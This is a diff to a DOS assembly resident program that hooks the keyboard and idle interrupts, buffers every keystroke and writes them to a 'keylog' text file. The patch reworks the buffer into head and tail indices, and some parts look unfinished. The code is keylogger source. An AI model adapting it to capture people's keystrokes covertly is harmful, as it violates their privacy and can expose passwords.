@@ -67,8 +67,8 @@ new_28h proc
 	;call original int 28h
 		pushf
 		call dword ptr cs:[old_28h_o]
-		iret
 
+		iret
 		endp
 
 old_28h_o dw 0h
@@ -88,7 +88,6 @@ new_9h proc
 		pop ds es
 		popa
 
-
 		iret
 		endp
 		
@@ -100,17 +99,28 @@ old_9h_s dw 0h
 
 read_to_buff proc 
 	
+		push ds
+		push cs
+		pop ds
+
 	;saving pressed key
 		mov ah, 01h	
 		int 16h
 
+		jz @@exit
+
 	;setting bx as len 
-		mov bl, len
+		mov bl, tail_ind 
 		xor bh, bh
 
 	;saving key to buff
 		mov buff[bx], al
-		inc len 
+		inc tail_ind 
+
+
+@@exit:
+
+		pop ds
 
 		ret
 		endp
@@ -118,11 +128,20 @@ read_to_buff proc
 
 flush_buff proc 
 
+
+		push ds
 		push cs
 		pop ds
+		
+		mov cl, cs:tail_ind
+		xor ch, ch
 
-		mov ah, len
+		;cmp head_ind, cl
+		;je @@exit
+	
+		push cx
 
+		;mov cl, tail_ind
 	;opening file by adress in ds:dx and saving its handler  
 		mov ax, 3d01h; 
 		mov dx, offset log_file;
@@ -137,22 +156,33 @@ flush_buff proc
 		xor dx, dx
 		int 21h
 
+;!!! 
+		mov al, head_ind
+		xor ah, ah
+		mov dx, offset buff
+		add dx, ax
+
+		pop cx
 	;writing to file
 		mov ah, 40h
 		mov bx, file_handler
-		mov cl, len
+		sub cl, head_ind
 		xor ch, ch
-		mov dx, offset buff
+;		mov dx, offset buff
+;		add dx, head_ind
 		int 21h
 		
-		mov len, 0d
+		add cl, head_ind
+		xor ch, ch
+		mov head_ind, cl
 
 	;closing file
 		mov ah, 3eh
 		mov bx, file_handler
 		int 21h
 
-
+@@exit:
+		pop ds
 		ret
 		endp
 
@@ -160,9 +190,13 @@ flush_buff proc
 log_file db 'c:\usr\keylog\log.txt', 0
 file_handler dw ?
 
-len db 0d
+head_ind db 0d
+mutex db 0
+tail_ind db 0d
 
-buff db 257d dup (0h)
+buff db 256d dup (0h)
+
+
 
 
 end_label:
